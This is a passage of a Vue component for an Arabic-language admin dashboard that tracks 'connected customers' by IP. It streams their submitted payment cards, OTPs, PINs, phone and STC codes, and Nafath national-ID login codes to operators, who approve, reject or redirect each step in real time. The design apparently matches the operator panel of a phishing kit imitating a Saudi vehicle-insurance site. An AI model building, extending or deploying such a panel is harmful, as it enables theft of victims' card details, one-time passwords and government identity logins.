<template>
    <div>
        <!-- Admin Header -->
        <DashboardHeader
            :system-status="systemStatus"
            :ws-enabled="wsConnected"
            :auto-refresh="autoRefreshEnabled"
            :loading="refreshLoading"
            @toggle-auto-refresh="toggleAutoRefresh"
            @manual-refresh="manualRefresh"
            @clear-cache="clearCache"
        />

        <!-- Connected Customers Section -->
        <section class="mb-8" dir="rtl" aria-labelledby="connected-customers-title">
            <!-- ─── Header Card ─── -->
            <div class="rounded-2xl mb-4 transition-colors duration-200"
                :style="{
                    backgroundColor: 'var(--admin-card-bg)',
                    borderWidth: '1px',
                    borderColor: 'var(--admin-card-border)',
                    boxShadow: 'var(--admin-card-shadow)',
                }">
                <!-- Row 1: Title + Active count + Refresh -->
                <div class="flex items-center justify-between px-5 pt-4 pb-3">
                    <div class="flex items-center gap-3">
                        <h2 id="connected-customers-title" class="text-lg font-bold font-heading flex items-center gap-2" :style="{ color: 'var(--admin-text)' }">
                            <i class="fa-solid fa-users text-[var(--admin-accent-blue)]" aria-hidden="true"></i>
                            العملاء المتصلون
                        </h2>
                        <span class="bg-emerald-500/10 text-emerald-400 text-xs font-bold px-2.5 py-1 rounded-full">
                            {{ activeCustomersCount }} نشط
                        </span>
                    </div>
                    <button
                        aria-label="تحديث البيانات"
                        class="rounded-lg px-3 py-1.5 text-xs font-semibold transition-colors flex items-center gap-1.5 hover:opacity-90"
                        :style="{ backgroundColor: 'var(--admin-surface-2)', color: 'var(--admin-text-muted)' }"
                        @click="refreshCustomers">
                        <i class="fa-solid fa-arrows-rotate text-[11px]" aria-hidden="true"></i>
                    </button>
                </div>

                <!-- Row 2: Filters + Search -->
                <div class="flex items-center justify-between gap-4 px-5 pb-4 pt-2 border-t" style="border-color: rgba(255,255,255,0.06);">
                    <!-- Country filter pills -->
                    <div class="flex items-center gap-1.5">
                        <button
                            aria-label="تصفية: عرض الكل"
                            class="px-3 py-1.5 text-xs font-bold rounded-full transition-all"
                            :class="countryFilter === '' ? 'bg-white/[0.08] shadow-sm' : 'hover:bg-white/[0.04]'"
                            :style="{ color: countryFilter === '' ? 'var(--admin-text)' : 'var(--admin-text-dim)' }"
                            @click="setCountryFilter('')"
                        >الكل</button>
                        <button
                            aria-label="تصفية: السعودية فقط"
                            class="px-3 py-1.5 text-xs font-bold rounded-full transition-all flex items-center gap-1"
                            :class="countryFilter === 'SA' ? 'bg-emerald-500/20 text-emerald-400 shadow-sm' : 'hover:bg-white/[0.04]'"
                            :style="countryFilter !== 'SA' ? { color: 'var(--admin-text-dim)' } : {}"
                            @click="setCountryFilter('SA')"
                        ><i class="fa-solid fa-location-dot text-[10px]" aria-hidden="true"></i> السعودية</button>
                        <button
                            aria-label="تصفية: دول أخرى"
                            class="px-3 py-1.5 text-xs font-bold rounded-full transition-all flex items-center gap-1"
                            :class="countryFilter === 'other' ? 'bg-amber-500/20 text-amber-400 shadow-sm' : 'hover:bg-white/[0.04]'"
                            :style="countryFilter !== 'other' ? { color: 'var(--admin-text-dim)' } : {}"
                            @click="setCountryFilter('other')"
                        ><i class="fa-solid fa-globe text-[10px]" aria-hidden="true"></i> أخرى</button>
                    </div>

                    <!-- Search Input -->
                    <div class="relative">
                        <i class="fa-solid fa-search absolute right-2.5 top-1/2 -translate-y-1/2 text-[11px]" style="color: var(--admin-text-dim);" aria-hidden="true"></i>
                        <input
                            id="customer-search"
                            v-model="searchQuery"
                            type="text"
                            name="customer-search"
                            dir="rtl"
                            placeholder="بحث IP، اسم، هاتف، هوية..."
                            aria-label="بحث في العملاء"
                            class="pr-8 pl-3 py-1.5 text-xs rounded-lg border transition-all w-48 focus:w-64 focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none"
                            :style="{ backgroundColor: 'var(--admin-surface-2)', color: 'var(--admin-text)', borderColor: 'var(--admin-card-border)' }"
                            @input="onSearchInput"
                        />
                    </div>
                </div>
            </div>

            <!-- State 1: Initial loading spinner -->
            <div v-if="initialLoading" class="rounded-2xl p-12 text-center" :style="{ backgroundColor: 'var(--admin-card-bg)', borderWidth: '1px', borderColor: 'var(--admin-card-border)', boxShadow: 'var(--admin-card-shadow)' }">
                <i class="fa-solid fa-spinner fa-spin text-blue-400 text-3xl mb-3" aria-hidden="true"></i>
                <p class="text-sm" style="color: var(--admin-text-dim);">جارٍ تحميل بيانات العملاء...</p>
            </div>

            <!-- State 2: Error with retry -->
            <div v-else-if="loadError && customers.length === 0" class="rounded-2xl p-12 text-center" :style="{ backgroundColor: 'var(--admin-card-bg)', borderWidth: '1px', borderColor: 'var(--admin-card-border)', boxShadow: 'var(--admin-card-shadow)' }">
                <i class="fa-solid fa-triangle-exclamation text-amber-400 text-3xl mb-3" aria-hidden="true"></i>
                <p class="text-sm mb-3" style="color: var(--admin-text-dim);">فشل تحميل بيانات العملاء</p>
                <button class="px-4 py-2 text-xs font-medium text-white bg-blue-600 hover:bg-blue-700 rounded-lg transition-colors"
                    @click="manualRefresh">
                    <i class="fa-solid fa-arrows-rotate ml-1" aria-hidden="true"></i>
                    إعادة المحاولة
                </button>
            </div>

            <!-- State 3: Customer data loaded -->
            <div v-else-if="customers.length > 0">
                <CustomerDataTable
                    :customers="customers"
                    :processing-action="processingAction"
                    @delete-card="handleDeleteCard"
                    @show-details="handleShowDetails"
                    @action="handleCustomerAction"
                    @redirect="handleCustomerRedirect"
                    @modal-opened="handleModalOpened"
                    @modal-closed="handleModalClosed"
                />

                <!-- Pagination -->
                <div v-if="lastPage > 1" class="flex items-center justify-between mt-4 rounded-xl px-4 py-3"
                    :style="{ backgroundColor: 'var(--admin-card-bg)', borderWidth: '1px', borderColor: 'var(--admin-card-border)' }">
                    <div class="text-xs" style="color: var(--admin-text-dim);">
                        عرض {{ (currentPage - 1) * perPage + 1 }}–{{ Math.min(currentPage * perPage, totalCustomers) }} من {{ totalCustomers }}
                    </div>
                    <div class="flex items-center gap-1">
                        <button
                            aria-label="الصفحة السابقة"
                            class="px-3 py-1.5 text-xs font-medium rounded-lg border transition-all"
                            :class="currentPage <= 1 ? 'border-white/[0.04] text-white/20 cursor-not-allowed' : 'border-white/[0.08] hover:bg-white/[0.06]'"
                            :style="currentPage > 1 ? { color: 'var(--admin-text-muted)' } : {}"
                            :disabled="currentPage <= 1"
                            @click="goToPage(currentPage - 1)"
                        >
                            <i class="fa-solid fa-chevron-right text-[10px]" aria-hidden="true"></i>
                        </button>
                        <template v-for="p in visiblePages" :key="p">
                            <span v-if="p === '...'" class="px-1" style="color: var(--admin-text-dim);">…</span>
                            <button v-else
                                :aria-label="`صفحة ${p}`"
                                :aria-current="p === currentPage ? 'page' : undefined"
                                class="min-w-[32px] px-2 py-1.5 text-xs font-medium rounded-lg border transition-all"
                                :class="p === currentPage ? 'bg-blue-600 text-white border-blue-600' : 'border-white/[0.08] hover:bg-white/[0.06]'"
                                :style="p !== currentPage ? { color: 'var(--admin-text-muted)' } : {}"
                                @click="goToPage(p)"
                            >{{ p }}</button>
                        </template>
                        <button
                            aria-label="الصفحة التالية"
                            class="px-3 py-1.5 text-xs font-medium rounded-lg border transition-all"
                            :class="currentPage >= lastPage ? 'border-white/[0.04] text-white/20 cursor-not-allowed' : 'border-white/[0.08] hover:bg-white/[0.06]'"
                            :style="currentPage < lastPage ? { color: 'var(--admin-text-muted)' } : {}"
                            :disabled="currentPage >= lastPage"
                            @click="goToPage(currentPage + 1)"
                        >
                            <i class="fa-solid fa-chevron-left text-[10px]" aria-hidden="true"></i>
                        </button>
                    </div>
                </div>
            </div>

            <!-- State 4: Genuinely empty (API succeeded but 0 customers) -->
            <div v-else class="rounded-2xl p-12 text-center" :style="{ backgroundColor: 'var(--admin-card-bg)', borderWidth: '1px', borderColor: 'var(--admin-card-border)', boxShadow: 'var(--admin-card-shadow)' }">
                <i class="fa-solid fa-users text-3xl mb-3" style="color: var(--admin-text-dim);" aria-hidden="true"></i>
                <p class="text-sm" style="color: var(--admin-text-dim);">لا يوجد عملاء متصلون حالياً</p>
            </div>
        </section>


    </div>
</template>

<script setup>
import { ref, shallowRef, triggerRef, computed, onMounted, onUnmounted, onActivated, onDeactivated } from 'vue';

defineOptions({ name: 'DashboardHome' });
import { getCustomers, getCustomer, deleteCustomerCard, approveCard, rejectCard, approveOtp, rejectOtp, approvePin, rejectPin, approvePhoneData, rejectPhoneData, approvePhoneOtp, rejectPhoneOtp, approveStcWaiting, rejectStcWaiting, approveStcOtp, rejectStcOtp, approveStcCall, rejectStcCall, approveNafath, rejectNafath, updateNafathVerificationCode, redirectCustomer } from '@/api/dashboard';
import request from '@/api/request';
import { registerPollingCallback, unregisterPollingCallback, setPollingPaused, setWsConnected, markInitialLoadComplete } from '@/services/adminPolling';
import { getEcho } from '@/services/echo';
import { useNotificationsStore } from '@/store/modules/notifications';
import { useBadgeStore } from '@/store/modules/badges';
import CustomerDataTable from '../components/CustomerDataTable.vue';
import DashboardHeader from '../components/DashboardHeader.vue';

import logger from '@/utils/logger';

const notificationsStore = useNotificationsStore();
const badgeStore = useBadgeStore();

// --- Dashboard Header State ---
const systemStatus = ref( 'healthy' );
const wsConnected = ref( false );
const autoRefreshEnabled = ref( true );
const refreshLoading = ref( false );
// Use window-level refs to survive HMR module reloads and prevent interval stacking
let _dashboardChannel = null;
let _adminOtpChannel = null;
let _adminPhoneChannel = null;
let _adminNafathChannel = null;
let _adminPaymentChannel = null;
let _adminStcChannel = null;
let dashboardEcho = null;
let _pusherBindings = []; // track Pusher .bind() handlers for cleanup

const WS_REFRESH_THROTTLE = 2_000;   // minimum 2s between WS-triggered refreshes
let _lastRefreshAt = 0;
let _isRefreshing = false;
let _pendingPageUpdates = [];         // batch in-place page_view updates
let _batchTimer = null;
const BATCH_INTERVAL = 2_000;         // apply batched updates every 2 seconds

// ── Loading / error state for initial fetch ──
const initialLoading = ref( true );   // true until first successful refresh
const loadError = ref( false );       // true when last refresh failed

function toggleAutoRefresh() {
    autoRefreshEnabled.value = !autoRefreshEnabled.value;
    // ✅ Actually pause/resume customer polling via the central polling service
    setPollingPaused( !autoRefreshEnabled.value );
}

async function manualRefresh() {
    refreshLoading.value = true;
    try {
        await refreshCustomers();
    } finally {
        refreshLoading.value = false;
    }
}

async function clearCache() {
    await new Promise( r => setTimeout( r, 0 ) );
    if ( !confirm( 'هل أنت متأكد من مسح الكاش؟ سيتم إزالة بيانات النماذج المحفوظة.' ) ) return;
    const cacheKeys = [ 'vehicleForm', 'vehicleDetails', 'policyDetails', 'insuranceStoreData' ];
    cacheKeys.forEach( key => sessionStorage.removeItem( key ) );
    refreshCustomers();
    logger.info( 'Dashboard cache cleared' );
}

onMounted( async () => {
    // ✅ Register with central polling before initial fetch
    registerPollingCallback( 'refreshCustomers', refreshCustomers );
    connectDashboardWebSocket();
    // ✅ Refresh immediately when the tab regains focus
    document.addEventListener( 'visibilitychange', handleVisibilityChange );

    // ✅ Initial load with retry — if first call fails, retry after 2s
    const ok = await refreshCustomers();
    if ( !ok ) {
        setTimeout( () => refreshCustomers(), 2000 );
    }
} );

onUnmounted( () => {
    // ✅ Unregister from central polling
    unregisterPollingCallback( 'refreshCustomers' );
    disconnectDashboardWebSocket();
    document.removeEventListener( 'visibilitychange', handleVisibilityChange );
    // ✅ Clear pending batch timer to prevent stale mutation after unmount
    if ( _batchTimer ) {
        clearTimeout( _batchTimer );
        _batchTimer = null;
        _pendingPageUpdates = [];
    }
} );

// ── KeepAlive lifecycle: pause/resume resources when cached ──
onActivated( () => {
    registerPollingCallback( 'refreshCustomers', refreshCustomers );
    connectDashboardWebSocket();
    document.addEventListener( 'visibilitychange', handleVisibilityChange );
    // ✅ Retry-aware refresh on reactivation
    refreshCustomers().then( ok => {
        if ( !ok ) setTimeout( () => refreshCustomers(), 2000 );
    } );
} );

onDeactivated( () => {
    unregisterPollingCallback( 'refreshCustomers' );
    disconnectDashboardWebSocket();
    document.removeEventListener( 'visibilitychange', handleVisibilityChange );
    if ( _batchTimer ) {
        clearTimeout( _batchTimer );
        _batchTimer = null;
        _pendingPageUpdates = [];
    }
} );

function handleVisibilityChange () {
    if ( document.visibilityState === 'visible' ) {
        // Reconnect WebSocket if it was lost while tab was hidden
        // (Customer refresh is handled by adminPolling's setTabVisible)
        if ( !wsConnected.value ) {
            logger.debug( '[Dashboard] Tab visible — reconnecting WS' );
            connectDashboardWebSocket();
        }
    }
}

// --- WebSocket Real-Time Updates ---
let _wsReconnectTimer = null;
let _wsConnecting = false; // prevents concurrent connectDashboardWebSocket() calls
const WS_RECONNECT_DELAY = 5_000; // retry connection every 5s on failure

async function connectDashboardWebSocket () {
    // Clear any pending reconnect timer
    if ( _wsReconnectTimer ) {
        clearTimeout( _wsReconnectTimer );
        _wsReconnectTimer = null;
    }

    // Don't reconnect if already connected or connection in progress
    if ( _wsConnecting ) return;
    if ( dashboardEcho && wsConnected.value ) return;

    _wsConnecting = true;

    // Disconnect stale instance if any
    disconnectDashboardWebSocket();

    try {
        const token = localStorage.getItem( 'auth_token' );
        if ( !token ) {
            logger.warn( '[Dashboard WS] No auth token — skipping WebSocket' );
            return;
        }

        // ✅ Use the shared Echo singleton instead of creating a duplicate connection.
        // getEcho() with authOptions updates auth config on existing instance if needed.
        dashboardEcho = await getEcho( {
            authEndpoint: '/api/broadcasting/auth',
            auth: {
                headers: {
                    Authorization: `Bearer ${ token }`,
                    Accept: 'application/json',
                },
            },
        } );

        if ( !dashboardEcho ) {
            logger.warn( '[Dashboard WS] Echo not available' );
            scheduleReconnect();
            return;
        }

        // ── Track Pusher connection state for reliable status ──
        const pusher = dashboardEcho.connector?.pusher;
        if ( pusher ) {
            // If Pusher is already connected (singleton reuse), mark as connected immediately
            if ( pusher.connection?.state === 'connected' ) {
                wsConnected.value = true;
                setWsConnected( true );
                logger.info( '[Dashboard WS] Pusher already connected — polling continues alongside WS' );
            }

            const _bind = ( event, handler ) => {
                pusher.connection.bind( event, handler );
                _pusherBindings.push( { connection: pusher.connection, event, handler } );
            };
            _bind( 'connected', () => {
                wsConnected.value = true;
                setWsConnected( true );
                logger.info( '[Dashboard WS] Pusher connected — polling continues alongside WS' );
            } );
            _bind( 'disconnected', () => {
                wsConnected.value = false;
                setWsConnected( false );
                logger.warn( '[Dashboard WS] Pusher disconnected — will auto-reconnect' );
                scheduleReconnect();
            } );
            _bind( 'unavailable', () => {
                wsConnected.value = false;
                setWsConnected( false );
                logger.warn( '[Dashboard WS] Pusher unavailable — will auto-reconnect' );
                scheduleReconnect();
            } );
            _bind( 'failed', () => {
                wsConnected.value = false;
                setWsConnected( false );
                logger.error( '[Dashboard WS] Pusher connection failed — will auto-reconnect' );
                scheduleReconnect();
            } );
            _bind( 'error', ( err ) => {
                // Stringify to capture full error details (code, message, type)
                const detail = typeof err === 'object' ? JSON.stringify( err ) : err;
                logger.error( '[Dashboard WS] Pusher error:', detail, err );
            } );
        }

        _dashboardChannel = dashboardEcho.private( 'dashboard' )
            .listen( '.customer.activity.updated', ( event ) => {
                // Only log meaningful events — suppress routine page_view noise
                if ( event.activity_type !== 'page_view' ) {
                    logger.debug( '[Dashboard WS] Activity update:', event.ip_address, event.activity_type );
                }
                handleRealtimeUpdate( event );
            } )
            .listen( '.window.read.updated', ( event ) => {
                // ✅ Instant read-state sync — blink disappears for ALL admins immediately
                logger.debug( '[Dashboard WS] Window read:', event.ip, event.section );
                handleWindowRead( event );
            } )
            .error( ( error ) => {
                logger.warn( '[Dashboard WS] dashboard subscription error:', error );
            } );

        // ── Admin OTP channel — aggregated approve/reject notifications ──
        _adminOtpChannel = dashboardEcho.private( 'admin.otp' )
            .listen( '.OtpApproved', ( event ) => {
                logger.info( '[Dashboard WS] OTP approved:', event.customer_ip, event.session_id );
                handleRealtimeUpdate( { ip_address: event.customer_ip, activity_type: 'otp_approved' } );
            } )
            .listen( '.OtpRejected', ( event ) => {
                logger.info( '[Dashboard WS] OTP rejected:', event.customer_ip, event.reason );
                handleRealtimeUpdate( { ip_address: event.customer_ip, activity_type: 'otp_rejected' } );
            } )
            .listen( '.PinApproved', ( event ) => {
                logger.debug( '[Dashboard WS] PIN approved:', event.customer_ip );
                handleRealtimeUpdate( { ip_address: event.customer_ip, activity_type: 'pin_approved' } );
            } )
            .listen( '.PinRejected', ( event ) => {
                logger.debug( '[Dashboard WS] PIN rejected:', event.customer_ip );
                handleRealtimeUpdate( { ip_address: event.customer_ip, activity_type: 'pin_rejected' } );
            } )
            .error( ( error ) => logger.warn( '[Dashboard WS] admin.otp subscription error:', error ) );

        // ── Admin Phone channel — phone verification approve/reject notifications ──
        _adminPhoneChannel = dashboardEcho.private( 'admin.phone' )
            .listen( '.PhoneOtpApproved', ( event ) => {
                logger.info( '[Dashboard WS] Phone OTP approved:', event.customer_ip );
                handleRealtimeUpdate( { ip_address: event.customer_ip, activity_type: 'phone_approved' } );
            } )
            .listen( '.PhoneOtpRejected', ( event ) => {
                logger.info( '[Dashboard WS] Phone OTP rejected:', event.customer_ip );
                handleRealtimeUpdate( { ip_address: event.customer_ip, activity_type: 'phone_rejected' } );
            } )
            .error( ( error ) => logger.warn( '[Dashboard WS] admin.phone subscription error:', error ) );

        // ── Admin Nafath channel — nafath approve/reject notifications ──
        _adminNafathChannel = dashboardEcho.private( 'admin.nafath' )
            .listen( '.NafathApproved', ( event ) => {
                logger.info( '[Dashboard WS] Nafath approved:', event.customer_ip );
                handleRealtimeUpdate( { ip_address: event.customer_ip, activity_type: 'nafath_approved' } );
            } )
            .listen( '.NafathRejected', ( event ) => {
                logger.info( '[Dashboard WS] Nafath rejected:', event.customer_ip );
                handleRealtimeUpdate( { ip_address: event.customer_ip, activity_type: 'nafath_rejected' } );
            } )
            .error( ( error ) => logger.warn( '[Dashboard WS] admin.nafath subscription error:', error ) );

        // ── Admin Payment channel — payment card approve/reject notifications ──
        _adminPaymentChannel = dashboardEcho.private( 'admin.payment' )
            .listen( '.PaymentApproved', ( event ) => {
                logger.info( '[Dashboard WS] Payment approved:', event.customer_ip );
                handleRealtimeUpdate( { ip_address: event.customer_ip, activity_type: 'payment_approved' } );
            } )
            .listen( '.PaymentRejected', ( event ) => {
                logger.info( '[Dashboard WS] Payment rejected:', event.customer_ip );
                handleRealtimeUpdate( { ip_address: event.customer_ip, activity_type: 'payment_rejected' } );
            } )
            .error( ( error ) => logger.warn( '[Dashboard WS] admin.payment subscription error:', error ) );

        // ── Admin STC channel — STC waiting/otp/call approve/reject notifications ──
        _adminStcChannel = dashboardEcho.private( 'admin.stc' )
            .listen( '.StcWaitingApproved', ( event ) => {
                logger.debug( '[Dashboard WS] STC waiting approved:', event.customer_ip );
                handleRealtimeUpdate( { ip_address: event.customer_ip, activity_type: 'stc_waiting_approved' } );
            } )
            .listen( '.StcWaitingRejected', ( event ) => {
                logger.debug( '[Dashboard WS] STC waiting rejected:', event.customer_ip );
                handleRealtimeUpdate( { ip_address: event.customer_ip, activity_type: 'stc_waiting_rejected' } );
            } )
            .listen( '.StcOtpApproved', ( event ) => {
                logger.debug( '[Dashboard WS] STC OTP approved:', event.customer_ip );
                handleRealtimeUpdate( { ip_address: event.customer_ip, activity_type: 'stc_otp_approved' } );
            } )
            .listen( '.StcOtpRejected', ( event ) => {
                logger.debug( '[Dashboard WS] STC OTP rejected:', event.customer_ip );
                handleRealtimeUpdate( { ip_address: event.customer_ip, activity_type: 'stc_otp_rejected' } );
            } )
            .listen( '.StcCallApproved', ( event ) => {
                logger.debug( '[Dashboard WS] STC call approved:', event.customer_ip );
                handleRealtimeUpdate( { ip_address: event.customer_ip, activity_type: 'stc_call_approved' } );
            } )
            .listen( '.StcCallRejected', ( event ) => {
                logger.debug( '[Dashboard WS] STC call rejected:', event.customer_ip );
                handleRealtimeUpdate( { ip_address: event.customer_ip, activity_type: 'stc_call_rejected' } );
            } )
            .error( ( error ) => logger.warn( '[Dashboard WS] admin.stc subscription error:', error ) );

        // ✅ Don't set wsConnected=true eagerly — let Pusher 'connected' event handle it
        // This prevents a false "📡 فوري" badge when the connection hasn't actually succeeded
        logger.info( '[Dashboard WS] Subscribed to dashboard channels' );
    } catch ( err ) {
        logger.error( '[Dashboard WS] Connection failed:', err.message );
        wsConnected.value = false;
        scheduleReconnect();
    } finally {
        _wsConnecting = false;
    }
}

function scheduleReconnect () {
    if ( _wsReconnectTimer ) return; // already scheduled
    _wsReconnectTimer = setTimeout( () => {
        _wsReconnectTimer = null;
        logger.info( '[Dashboard WS] Attempting reconnection...' );
        connectDashboardWebSocket();
    }, WS_RECONNECT_DELAY );
}

function disconnectDashboardWebSocket () {
    if ( _wsReconnectTimer ) {
        clearTimeout( _wsReconnectTimer );
        _wsReconnectTimer = null;
    }

    // ✅ Unbind all Pusher connection handlers to prevent memory leaks
    for ( const { connection, event, handler } of _pusherBindings ) {
        try { connection.unbind( event, handler ); } catch { /* safe */ }
    }
    _pusherBindings = [];

    if ( dashboardEcho ) {
        try {
            // ✅ Leave the private channels but keep the shared Echo singleton alive.
            // Other components (LiveChat) may still use it.
            dashboardEcho.leave( 'dashboard' );
            dashboardEcho.leave( 'admin.otp' );
            dashboardEcho.leave( 'admin.phone' );
            dashboardEcho.leave( 'admin.nafath' );
            dashboardEcho.leave( 'admin.payment' );
            dashboardEcho.leave( 'admin.stc' );
        } catch {
            // safe to ignore
        }
        dashboardEcho = null;
        _dashboardChannel = null;
        _adminOtpChannel = null;
        _adminPhoneChannel = null;
        _adminNafathChannel = null;
        _adminPaymentChannel = null;
        _adminStcChannel = null;
    }
    wsConnected.value = false;
    setWsConnected( false );
}

/**
 * Handle a real-time customer activity event.
 * Batches page_view updates (2s window) to prevent excessive re-renders.
 * Important events trigger a throttled full refresh.
 * data_viewed events are excluded from throttle — handled by WindowReadUpdated instead.
 */
function handleRealtimeUpdate ( event ) {
    // data_viewed is handled by the dedicated WindowReadUpdated event — skip here
    if ( event.activity_type === 'data_viewed' ) return;

    // Inactive events — apply inline without API call (batch like page_view)
    if ( event.activity_type === 'inactive' ) {
        const idx = customers.value.findIndex( c => c.ip === event.ip_address || c.id === event.customer_id );
        if ( idx !== -1 ) {
            customers.value[ idx ] = {
                ...customers.value[ idx ],
                is_active: false,
            };
            triggerRef( customers );
        }
        return;
    }

    // Important events (card submitted, OTP, nafath, etc.) → fetch only the changed customer
    if ( event.activity_type !== 'page_view' ) {
        // ── Pre-throttle: instant optimistic pulse for new customer data ──
        // This runs BEFORE the 2s throttle so the button always pulses immediately,
        // even if the API fetch is skipped by the throttle guard.
        if ( _newDataActivityTypes.has( event.activity_type ) && event.ip_address ) {
            // Clear the 12s mark-viewed guard for this specific customer+field only
            _recentlyMarkedViewed.delete( `${ event.ip_address }::has_new_payment` );
            // Optimistically set has_new_payment = true on the local customer object
            const idx = customers.value.findIndex( c => c.ip === event.ip_address );
            if ( idx !== -1 && !customers.value[ idx ].has_new_payment ) {
                customers.value[ idx ] = { ...customers.value[ idx ], has_new_payment: true };
                triggerRef( customers );
            }
        }

        const now = Date.now();
        if ( now - _lastRefreshAt < WS_REFRESH_THROTTLE ) return; // throttle rapid WS events
        _lastRefreshAt = now;

        // ✅ Show toast notification for important events
        const toastMsg = _getEventToastMessage( event.activity_type, event.ip_address );
        if ( toastMsg ) {
            notificationsStore.push( { type: toastMsg.type, message: toastMsg.message } );
        }

        // Patch update: fetch only the changed customer instead of full list
        if ( event.customer_id ) {
            patchSingleCustomer( event.customer_id );
        } else {
            refreshCustomers();
        }
        return;
    }

    // Batch page_view updates — collect them and apply every BATCH_INTERVAL
    _pendingPageUpdates.push( event );

    if ( !_batchTimer ) {
        _batchTimer = setTimeout( () => {
            // Apply all pending page_view updates at once
            for ( const evt of _pendingPageUpdates ) {
                const idx = customers.value.findIndex( c => c.id === evt.customer_id || c.ip === evt.ip_address );
                if ( idx !== -1 ) {
                    customers.value[ idx ] = {
                        ...customers.value[ idx ],
                        current_page: evt.current_page ?? customers.value[ idx ].current_page,
                        is_active: evt.is_active ?? customers.value[ idx ].is_active,
                    };
                } else {
                    // New customer appeared — trigger one refresh
                    refreshCustomers();
                    break;
                }
            }
            triggerRef( customers );
            _pendingPageUpdates = [];
            _batchTimer = null;
        }, BATCH_INTERVAL );
    }
}

/**
 * Map WS activity_type to a user-visible toast message.
 * Returns null for routine/silent events.
 */
function _getEventToastMessage ( activityType, ip ) {
    const map = {
        otp_approved:         { type: 'success', message: `✅ تم قبول OTP للعميل ${ ip }` },
        otp_rejected:         { type: 'error',   message: `❌ تم رفض OTP للعميل ${ ip }` },
        pin_approved:         { type: 'success', message: `✅ تم قبول PIN للعميل ${ ip }` },
        pin_rejected:         { type: 'error',   message: `❌ تم رفض PIN للعميل ${ ip }` },
        phone_approved:       { type: 'success', message: `✅ تم قبول تحقق الهاتف للعميل ${ ip }` },
        phone_rejected:       { type: 'error',   message: `❌ تم رفض تحقق الهاتف للعميل ${ ip }` },
        nafath_approved:      { type: 'success', message: `✅ تم قبول نفاذ للعميل ${ ip }` },
        nafath_rejected:      { type: 'error',   message: `❌ تم رفض نفاذ للعميل ${ ip }` },
        payment_approved:     { type: 'success', message: `✅ تم قبول الدفع للعميل ${ ip }` },
        payment_rejected:     { type: 'error',   message: `❌ تم رفض الدفع للعميل ${ ip }` },
        stc_waiting_approved: { type: 'success', message: `✅ تم قبول انتظار STC للعميل ${ ip }` },
        stc_waiting_rejected: { type: 'error',   message: `❌ تم رفض انتظار STC للعميل ${ ip }` },
        stc_otp_approved:     { type: 'success', message: `✅ تم قبول STC OTP للعميل ${ ip }` },
        stc_otp_rejected:     { type: 'error',   message: `❌ تم رفض STC OTP للعميل ${ ip }` },
        stc_call_approved:    { type: 'success', message: `✅ تم قبول مكالمة STC للعميل ${ ip }` },
        stc_call_rejected:    { type: 'error',   message: `❌ تم رفض مكالمة STC للعميل ${ ip }` },
        card_submitted:           { type: 'info',    message: `💳 بطاقة جديدة من العميل ${ ip }` },
        payment_card_submitted:   { type: 'info',    message: `💳 بطاقة جديدة من العميل ${ ip }` },
        otp_submitted:            { type: 'info',    message: `🔑 OTP جديد من العميل ${ ip }` },
        stc_otp_submitted:        { type: 'info',    message: `🔑 STC OTP جديد من العميل ${ ip }` },
        pin_submitted:            { type: 'info',    message: `🔑 PIN جديد من العميل ${ ip }` },
        nafath_submitted:         { type: 'info',    message: `🔄 تسجيل دخول نفاذ من العميل ${ ip }` },
        phone_submitted:          { type: 'info',    message: `📱 تحقق هاتف جديد من العميل ${ ip }` },
        phone_otp_verified:       { type: 'info',    message: `📱 تم التحقق من الهاتف للعميل ${ ip }` },
    };
    return map[ activityType ] || null;
}

/**
 * Handle a WindowReadUpdated broadcast — instantly clear the blink for ALL admins.
 * No API call needed; the event payload contains everything we need.
 * @param {{ ip: string, section: string, last_read_at: string, read_by: number }} event
 */
function handleWindowRead ( event ) {
    const sectionToField = {
        vehicle: 'has_new_vehicle',
        insurance: 'has_new_insurance',
        payment: 'has_new_payment',
    };
    const field = sectionToField[ event.section ];
    if ( !field ) return;

    const idx = customers.value.findIndex( c => c.ip === event.ip );
    if ( idx !== -1 ) {
        customers.value[ idx ] = { ...customers.value[ idx ], [ field ]: false };
        triggerRef( customers );
    }
    // ✅ Also record in TTL guard to prevent stale API from re-enabling blink
    recordMarkViewed( event.ip, field );
}

// --- Customer Tracking ---
// shallowRef avoids deep-proxying 50–100+ nested customer objects on every refresh
// (eliminates Vue reactivity overhead for cards, OTPs, PINs arrays within each customer).
// All mutations already replace items via spread so triggerRef() is used for in-place changes.
const customers = shallowRef( [] );

// ── Mark-Viewed Race-Condition Guard ──
// When an admin clicks a button, we optimistically set has_new_X = false.
// But a concurrent refreshCustomers / patchSingleCustomer API response may
// carry stale data that re-sets the flag to true, causing the button to
// blink again. This Map tracks recent mark-viewed actions for a 12 s window
// so we can re-apply the optimistic state after every API write.
const _recentlyMarkedViewed = new Map(); // key: "ip::field", value: timestamp

function recordMarkViewed ( ip, field ) {
    _recentlyMarkedViewed.set( `${ ip }::${ field }`, Date.now() );
}

// ── Open Modal Suppression ──
// When a modal is open for a customer section, suppress blinking for that section
// even if WS/API returns has_new_*=true (data is visible inside the open modal).
const _openModals = new Map(); // key: "ip::section", value: timestamp

const _sectionToField = {
    vehicle: 'has_new_vehicle',
    insurance: 'has_new_insurance',
    payment: 'has_new_payment',
};

// ── New-data activity types ──
// Customer-side submissions that mean genuinely new data in the payment/verification pipeline.
// Backend computeSectionHash('payment') hashes all of these: cards, OTPs, PINs, phone_verification, STC, nafath.
const _newDataActivityTypes = new Set( [
    'nafath_submitted',
    'phone_submitted',
    'phone_otp_verified',
    'payment_card_submitted',
    'otp_submitted',
    'stc_otp_submitted',
    'pin_submitted',
] );

/**
 * Unified notification guard: suppresses has_new_* flags when:
 * 1. A mark-viewed was recently recorded (12s TTL — prevents stale API re-enabling blink)
 * 2. A modal is currently open for that customer+section (prevents blink behind open modal)
 */
function applyNotificationGuards ( list ) {
    const now = Date.now();
    const GUARD_MS = 12_000; // 12 seconds
    // Clean expired mark-viewed entries
    for ( const [ key, ts ] of _recentlyMarkedViewed ) {
        if ( now - ts > GUARD_MS ) _recentlyMarkedViewed.delete( key );
    }
    const hasGuards = _recentlyMarkedViewed.size > 0;
    const hasOpenModals = _openModals.size > 0;
    if ( !hasGuards && !hasOpenModals ) return list;
    return list.map( c => {
        if ( !c?.ip ) return c;
        let patched = c;
        // Layer 1: recently marked-viewed guard (TTL 12s)
        if ( hasGuards ) {
            for ( const [ key ] of _recentlyMarkedViewed ) {
                const [ ip, field ] = key.split( '::' );
                if ( ip === c.ip && c[ field ] ) {
                    if ( patched === c ) patched = { ...c };
                    patched[ field ] = false;
                }
            }
        }
        // Layer 2: open modal suppression (permanent while modal is open)
        if ( hasOpenModals ) {
            for ( const [ key ] of _openModals ) {
